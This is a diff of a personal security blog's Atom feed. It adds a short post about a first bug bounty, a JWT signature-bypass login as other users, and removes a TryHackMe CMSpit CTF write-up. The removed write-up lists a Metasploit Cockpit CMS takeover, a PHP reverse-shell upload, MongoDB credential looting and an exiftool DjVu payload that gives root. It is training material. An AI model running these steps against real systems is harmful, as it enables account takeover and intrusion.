@@ -4,7 +4,7 @@
   <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
   <link href="https://darrynbrownfield.co.uk/author/darryn/feed.xml" rel="self" type="application/atom+xml" />
   <link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" />
-  <updated>2022-09-06T08:56:32+00:00</updated>
+  <updated>2022-10-01T12:05:23+00:00</updated>
   <id>https://darrynbrownfield.co.uk/author/darryn/feed.xml</id>
 
   
@@ -30,6 +30,97 @@
   
   
 
+  
+    <entry>
+      <title type="html">My first accepted bug bounty</title>
+      <link href="https://darrynbrownfield.co.uk/firstbugbounty" rel="alternate" type="text/html" title="My first accepted bug bounty" />
+      <published>2022-10-01T00:00:00+00:00</published>
+      <updated>2022-10-01T00:00:00+00:00</updated>
+      <id>https://darrynbrownfield.co.uk/firstbugbounty</id>
+      <content type="html" xml:base="https://darrynbrownfield.co.uk/firstbugbounty">&lt;p&gt;&lt;img src=&quot;/assets/images/firstbugbounty/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+&lt;p&gt;In this short blog post, I am going to explain how I found my first accepted bug, what the vulnerability was and my advice to people starting their journey in to the world of bug hunting.&lt;/p&gt;
+
+&lt;h3 id=&quot;background&quot;&gt;Background&lt;/h3&gt;
+&lt;p&gt;To be clear I am not an experienced bug hunter. For the past few years I have been studying and learning as much as I can about ethical hacking to obtain a role as a full time penetration tester which I’m pleased to say I have achieved starting October 2022. I completed my OSCP in 2020, CRTP in 2021 and will hopefully take the Burp Suite exam and TCM’s PNPT exam this year (2022).&lt;/p&gt;
+
+&lt;p&gt;My experience in bug bounty is very limited, I successfully became a member of the Synack Red Team in May 2022 and have slowly been spending more and more time on the platform to find vulnerabilities. I have to say &lt;a href=&quot;https://www.synack.com&quot;&gt;Synack&lt;/a&gt; have been amazing, its a great platform to work on with a fantastic community of people.&lt;/p&gt;
+
+&lt;h3 id=&quot;the-bug&quot;&gt;The bug!&lt;/h3&gt;
+&lt;p&gt;The bug I found was a actually very simple, a JWT authentication bypass via unverified signature. The first thing I do when looking at a target is just navigate around the application and click all the buttons, links etc with my traffic being proxies through Burp. Then once I have an understanding about the target and the functionally I review my Burp history and see if I can spot any interesting requests or parameters.&lt;/p&gt;
+
+&lt;p&gt;For this bug I noticed after I logged in a JWT token is sent via a POST request to the target. I decoded the JWT and replaced my username with another username. I then re-encoded the token and forwarded the request. To my surprise I was now logged in as the replacement username essentially allowing me to login in as anyone with a registered username on the platform.&lt;/p&gt;
+
+&lt;p&gt;At this point the adrenaline kicked in, I was so excited, my first legitimate vulnerability! It was about 11:30pm, I had work at 9am the next day but I wanted to be sure of my finding. I must have tested the bypass about 10 times with 4 different user accounts to be sure. I reported my findings around 1am and went to bed.&lt;/p&gt;
+
+&lt;p&gt;After what felt like a lifetime, I finally I got confirmation from Synack my vulnerability was accepted!&lt;/p&gt;
+
+&lt;p&gt;A great resource for learning about JWT attacks is on &lt;a href=&quot;https://portswigger.net/web-security/jwt&quot;&gt;Port Swigger Academy&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;recommendations&quot;&gt;Recommendations&lt;/h3&gt;
+&lt;p&gt;I am just starting out on this bug bounty journey but I wanted to share the recommendations and resources I have found useful. Before hunting for your first bugs, study! Learn the common vulnerabilities, understand the &lt;a href=&quot;https://owasp.org/www-project-top-ten/&quot;&gt;OWASP top 10&lt;/a&gt;. Complete CTF challenges to get the hands on experience of using tools like Burp and practice finding and exploiting vulnerabilities.&lt;/p&gt;
+
+&lt;p&gt;There is no quick fix or miracle methodology. You simple need to put in the hard work, the time in front of the computer and practice and preserver. I have seen lots of people ask, “how do I find my first bug” or say “I cant find any bugs”. I have been there, for months I couldn’t find anything but don’t give up, keep trying and eventually you will find one…. YOU GOT THIS!!&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;YOU GOT THIS!&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;My list of recommended learning material is:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://portswigger.net/web-security&quot;&gt;Port Swigger Academy&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.udemy.com/course/intro-to-bug-bounty-by-nahamsec/&quot;&gt;Nahamsec Bug Bounty Course&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/jhaddix/tbhm&quot;&gt;Jason Haddix The Bug Hunter’s Methodology (TBHM)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/channel/UCAndnmvdiphDqLLDrGnBuhA/about&quot;&gt;PhD Security&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/c/JohnHammond010&quot;&gt;John Hammond&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.amazon.co.uk/Bug-Bounty-Bootcamp-Reporting-Vulnerabilities/dp/1718501544&quot;&gt;Bug Bounty Bootcamp&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://tryhackme.com&quot;&gt;Tryhackme&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.hackthebox.com&quot;&gt;Hackthebox&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://academy.tcm-sec.com&quot;&gt;TCM Security Academy&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;next-steps&quot;&gt;Next steps…&lt;/h3&gt;
+&lt;p&gt;Find more bugs….. :) I have now been bitten by the bug (pun intended) and want to find more. There is still a lot more to learn and bugs to find and looking forward to see what the journey holds.&lt;/p&gt;
+
+&lt;p&gt;I hope to release more blog posts soon with further bug report write ups and tips and tricks I learn along the way.&lt;/p&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;
+
+&lt;p&gt;==========================================================================&lt;/p&gt;
+
+&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Darryn</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="bugbounty" />
+      
+        <category term="synack" />
+      
+
+      
+        <summary type="html"></summary>
+      
+
+      
+      
+    </entry>
   
     <entry>
       <title type="html">Hacker vs Hacker Write up</title>
@@ -2485,380 +2576,6 @@ root@mustacchio:/tmp#
         <category term="ctf" />
       
         <category term="easy" />
-      
-
-      
-        <summary type="html"></summary>
-      
-
-      
-      
-    </entry>
-  
-    <entry>
-      <title type="html">CMSpit Write Up</title>
-      <link href="https://darrynbrownfield.co.uk/cmspit" rel="alternate" type="text/html" title="CMSpit Write Up" />
-      <published>2021-08-08T00:00:00+00:00</published>
-      <updated>2021-08-08T00:00:00+00:00</updated>
-      <id>https://darrynbrownfield.co.uk/cmspit</id>
-      <content type="html" xml:base="https://darrynbrownfield.co.uk/cmspit">&lt;p&gt;&lt;img src=&quot;/assets/images/cmspit/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/cmspit&quot;&gt;cmspit&lt;/a&gt; is a medium rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;. This was a good machine highlighting recent CVE’s, thanks &lt;a href=&quot;https://twitter.com/_stuxnet&quot;&gt;stuxnet&lt;/a&gt;.&lt;/p&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-
-&lt;p&gt;Although not required I added a entry in my hosts file with the machine IP to cmspit.thm. Once added I started a nmap scan to check for available ports.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA nmap/initial cmspit.thm
-Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-08 11:11 BST
-Nmap scan report for cmspit.thm (10.10.34.218)
-Host is up (0.035s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 7f:25:f9:40:23:25:cd:29:8b:28:a9:d9:82:f5:49:e4 (RSA)
-|   256 0a:f4:29:ed:55:43:19:e7:73:a7:09:79:30:a8:49:1b (ECDSA)
-|_  256 2f:43:ad:a3:d1:5b:64:86:33:07:5d:94:f9:dc:a4:01 (ED25519)
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-| http-title: Authenticate Please!
-|_Requested resource was /auth/login?to=/
-|_http-trane-info: Problem with XML parsing of /evox/about
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 11.50 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;2 Ports open:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;22 - SSH - OpenSSH 7.2p2&lt;/li&gt;
-  &lt;li&gt;80 - HTTP - Apache 2.4.18&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;I ran a full port scan but no additional ports were found.&lt;/p&gt;
-
-&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
-
-&lt;p&gt;Clearly this is going to be a web challenge, while I poked around the website I wanted some enumeration going on in the background so started Gobuster and Nikto.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -u cmspit.thm -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://cmspit.thm
-[+] Threads:        10
-[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Timeout:        10s
-===============================================================
-2021/08/08 11:16:09 Starting gobuster
-===============================================================
-Error: the server returns a status code that matches the provided options for non existing urls. http://cmspit.thm/fbaebb24-03e7-4123-b75f-01915dfcbf6b =&amp;gt; 302. To force processi
-ng of Wildcard responses, specify the '--wildcard' switch
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;However is looks like all requests are being sent to ‘http://cmspit.thm/auth/login?to=/’&lt;/p&gt;
-
-&lt;p&gt;However, I did have some more luck with Nikto.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nikto -h cmspit.thm
-- Nikto v2.1.6
----------------------------------------------------------------------------
-+ Target IP:          10.10.34.218
-+ Target Hostname:    cmspit.thm
-+ Target Port:        80
-+ Start Time:         2021-08-08 11:18:16 (GMT1)
----------------------------------------------------------------------------
-+ Server: Apache/2.4.18 (Ubuntu)
-+ Cookie 8071dec2be26139e39a170762581c00f created without the httponly flag
-+ The anti-clickjacking X-Frame-Options header is not present.
-+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
-+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
-+ Root page / redirects to: /auth/login?to=/
-+ No CGI Directories found (use '-C all' to force check all possible dirs)
-+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
-+ OSVDB-3233: /icons/README: Apache default file found.
-+ Retrieved access-control-allow-origin header: *
-+ /server-status: Apache server-status interface found (protected/forbidden)
-+ /composer.json: PHP Composer configuration file reveals configuration information - https://getcomposer.org/
-+ /package.json: Node.js package file found. It may contain sensitive information.
-+ 7789 requests: 3 error(s) and 10 item(s) reported on remote host
-+ End Time:           2021-08-08 11:25:02 (GMT1) (406 seconds)
----------------------------------------------------------------------------
-+ 1 host(s) tested
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I went to http://cmspit.thm/ which redirected me to http://cmspit.thm/auth/login?to=/. I tried some basic username and password combinations but nothing worked.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/cmspit/homepage.png&quot; alt=&quot;homepage&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;From the logo and name on the authentication page, its clear we are working with Cockpit CMS. I checked the source code and found the version 0.11.1. This was also confirmed by going to http://cmspit.thm/package.json found via Nikto.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/cmspit/version.png&quot; alt=&quot;version&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I googled ‘cockpit cms 0.11.1 exploit’ and found a great &lt;a href=&quot;https://swarm.ptsecurity.com/rce-cockpit-cms/&quot;&gt;blog&lt;/a&gt; by &lt;a href=&quot;https://twitter.com/ultrayoba&quot;&gt;Nikita Petrov&lt;/a&gt;, however im lazy and also found a metasploit module.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;msf6 &amp;gt; search cockpit
-
-Matching Modules
-================
-
-   #  Name                                Disclosure Date  Rank    Check  Description
-   -  ----                                ---------------  ----    -----  -----------
-   0  exploit/multi/http/cockpit_cms_rce  2021-04-13       normal  Yes    Cockpit CMS NoSQLi to RCE
-
-
-Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/cockpit_cms_rce
-
-msf6 &amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I selected the module using the command ‘use 0’ and filled out the options.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;msf6 exploit(multi/http/cockpit_cms_rce) &amp;gt; show options
-
-Module options (exploit/multi/http/cockpit_cms_rce):
-
-   Name        Current Setting  Required  Description
-   ----        ---------------  --------  -----------
-   ENUM_USERS  true             no        Enumerate users
-   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS      cmspit.thm       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
-   RPORT       80               yes       The target port (TCP)
-   SSL         false            no        Negotiate SSL/TLS for outgoing connections
-   TARGETURI   /                yes       The URI of Cockpit
-   USER                         no        User account to take over
-   VHOST                        no        HTTP server virtual host
-
-
-Payload options (php/meterpreter/reverse_tcp):
-
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST  tun0             yes       The listen address (an interface may be specified)
-   LPORT  4444             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic Target
-
-
-msf6 exploit(multi/http/cockpit_cms_rce) &amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I ran the module and was able to find 4 users, however the module then failed as a user was required.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;msf6 exploit(multi/http/cockpit_cms_rce) &amp;gt; run
-
-[*] Started reverse TCP handler on &amp;lt;Local Machine&amp;gt;:4444 
-[*] Attempting Username Enumeration (CVE-2020-35846)
-[+]   Found users: [&quot;admin&quot;, &quot;darkStar7471&quot;, &quot;skidy&quot;, &quot;ekoparty&quot;]
-[-] Exploit aborted due to failure: bad-config: cmspit.thm:80 - User to exploit required
-[*] Exploit completed, but no session was created.
-msf6 exploit(multi/http/cockpit_cms_rce) &amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I set user to admin and ran the module again.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;msf6 exploit(multi/http/cockpit_cms_rce) &amp;gt; set user admin
-user =&amp;gt; admin
-msf6 exploit(multi/http/cockpit_cms_rce) &amp;gt; run
-
-[*] Started reverse TCP handler on &amp;lt;Local Machine&amp;gt;:4444 
-[*] Attempting Username Enumeration (CVE-2020-35846)
-[+]   Found users: [&quot;admin&quot;, &quot;darkStar7471&quot;, &quot;skidy&quot;, &quot;ekoparty&quot;]
-[*] Obtaining reset tokens (CVE-2020-35847)
-[+]   Found tokens: [&quot;rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23&quot;]
-[*] Checking token: rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23
-[*] Obtaining user info
-[*]   user: admin
-[*]   name: Admin
-[*]   email: admin@yourdomain.de
-[*]   active: true
-[*]   group: admin
-[*]   password: &amp;lt;REDACTED&amp;gt;
-[*]   i18n: en
-[*]   _created: 1621655201
-[*]   _modified: 1621655201
-[*]   _id: 60a87ea165343539ee000300
-[*]   _reset_token: rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23
-[*]   md5email: a11eea8bf873a483db461bb169beccec
-[+] Changing password to &amp;lt;REDACTED&amp;gt;
-[+] Password update successful
-[*] Attempting login
-[-] Exploit failed: ArgumentError wrong number of arguments (given 3, expected 1..2)
-[*] Exploit completed, but no session was created.
-msf6 exploit(multi/http/cockpit_cms_rce) &amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The exploit failed again however it was able to change the admin password. I went back to the login page and was able to log in as admin.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/cmspit/loggedin.png&quot; alt=&quot;loggedin&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
-
-&lt;p&gt;In the blog post, RCE was possible by uploading a PHP script via the finder directory so I went to cmspit.thm/finder&lt;/p&gt;
-
-&lt;p&gt;I copied a PHP reverse shell script to my directory.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cp /usr/share/webshells/php/php-reverse-shell.php .
-┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]
-└──╼ $mv php-reverse-shell.php shell.php
-┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I updated the script with my tun0 IP and port of 4444 and started a nc listener with the command &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -nvlp 4444&lt;/code&gt;. On the webpage I clicked the upload button and selected my shell.php file.&lt;/p&gt;
-
-&lt;p&gt;Now going to ‘http://cmspit.thm/shell.php’ I get a shell!&lt;/p&gt;
-
-&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
-
-&lt;p&gt;Now I have a shell as www-data I want to escalate my privileges. I enumerated the machine and noticed Mongodb was listening on TCP port 27017.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer                  
-tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      off (0.00/0/0)         
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)              
-tcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)         
-tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)               
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I connected to the mongodb service and was able to find the credentials for the user ‘stux’.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ mongo 127.0.0.1:27017
-MongoDB shell version: 2.6.10
-connecting to: 127.0.0.1:27017/test
-show dbs
-admin         (empty)
-local         0.078GB
-sudousersbak  0.078GB
-use sudousersbak
-show collections
-switched to db sudousersbak
-flag
-system.indexes
-user
-db.user.find()
-{ &quot;_id&quot; : ObjectId(&quot;60a89d0caadffb0ea68915f9&quot;), &quot;name&quot; : &quot;&amp;lt;REDACTED&amp;gt;&quot; }
-{ &quot;_id&quot; : ObjectId(&quot;60a89dfbaadffb0ea68915fa&quot;), &quot;name&quot; : &quot;stux&quot; }
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I used the credentials to SSH to the machine and ran the command ‘sudo -l’.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $ssh stux@cmspit.thm
-stux@cmspit.thm's password: 
-Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-Last login: Sat May 22 19:41:38 2021 from 192.168.85.1
-stux@ubuntu:~$ sudo -l
-Matching Defaults entries for stux on ubuntu:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User stux may run the following commands on ubuntu:
-    (root) NOPASSWD: /usr/local/bin/exiftool
-stux@ubuntu:~$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The user stux can run the command /usr/local/bin/exiftool as root with out the root password. Normally, I would now go to GTFObins to look for a priv esc, however the room questions indicate a CVE vulnerability so I googled ‘exiftools CVE’ and found this &lt;a href=&quot;https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/&quot;&gt;blog&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;In the blog it details the steps of how to exploit the vulnerability which is:&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;$ sudo apt install djvulibre-bin&lt;/p&gt;
-
-  &lt;p&gt;$ bzz payload payload.bzz&lt;/p&gt;
-
-  &lt;p&gt;$ djvumake exploit.djvu INFO=’1,1’ BGjp=/dev/null ANTz=payload.bzz&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Back on my local machine, I created a payload file with the following contents &lt;code class=&quot;highlighter-rouge&quot;&gt;(metadata &quot;\c${system('/bin/bash')};&quot;)&lt;/code&gt;, then followed the steps above.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]
-└──╼ $cat payload
-(metadata &quot;\c${system('/bin/bash')};&quot;)
-┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]
-└──╼ $sudo apt install djvulibre-bin
-Reading package lists... Done
-Building dependency tree       
-Reading state information... Done
-djvulibre-bin is already the newest version (3.5.28-2).
-The following packages were automatically installed and are no longer required:
-  gdal-data libaec0 libarmadillo9 libarpack2 libboost-locale1.67.0 libcfitsio8 libcharls2 libdap25 libdapclient6v5 libepsilon1 libfreexl1 libfyba0 libgdal26 libgeos-3.8.1
-  libgeos-c1v5 libgeotiff5 libgfapi0 libgfrpc0 libgfxdr0 libglusterfs0 libhdf4-0-alt libhdf5-103 libkmlbase1 libkmldom1 libkmlengine1 libnetcdf15 libogdi4.1 liborcus-0.15-0
-  liborcus-parser-0.15-0 libproj19 libpython3.7-minimal libpython3.7-stdlib libpython3.8-dev libqhull7 libspatialite7 libsuperlu5 libsz2 liburiparser1 libxerces-c3.2 odbcinst
-  odbcinst1debian2 proj-bin proj-data python3-gridfs python3.7 python3.7-minimal python3.8-dev
-Use 'sudo apt autoremove' to remove them.
-0 upgraded, 0 newly installed, 0 to remove and 2541 not upgraded.
-┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]
-└──╼ $bzz payload payload.bzz
-┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]
-└──╼ $djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
-┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]
-└──╼ $ls -la exploit.djvu 
--rw-r--r-- 1 daz daz 92 Aug  8 12:13 exploit.djvu
-┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]
-└──╼ $
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Finaly I started a Python webserver with the command &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo python3 -m http.server 80&lt;/code&gt;. Next back on cmspit machine I downloaded the exploit.djvu file with wget and ran the exif tool as sudo against the exploit file and got root!&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;stux@ubuntu:~$ wget http://&amp;lt;Local Machine&amp;gt;/exploit.djvu
---2021-08-08 04:16:42--  http://&amp;lt;Local Machine&amp;gt;/exploit.djvu
-Connecting to &amp;lt;Local Machine&amp;gt;:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 92 [image/vnd.djvu]
-Saving to: ‘exploit.djvu’
-
-exploit.djvu                                 100%[===========================================================================================&amp;gt;]      92  --.-KB/s    in 0s
-
-2021-08-08 04:16:42 (17.8 MB/s) - ‘exploit.djvu’ saved [92/92]
-
-stux@ubuntu:~$ sudo /usr/local/bin/exiftool exploit.djvu 
-root@ubuntu:~# whoami
-root
-root@ubuntu:~# hostname
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Thanks for reading!&lt;/p&gt;
-
-&lt;p&gt;============================================================&lt;/p&gt;
-
-&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>
-
-      
-      
-      
-      
-      
-
-      <author>
-          <name>Darryn</name>
-        
-        
-      </author>
-
-      
-
-      
-        <category term="tryhackme" />
-      
-        <category term="ctf" />
-      
-        <category term="medium" />
       
 
       
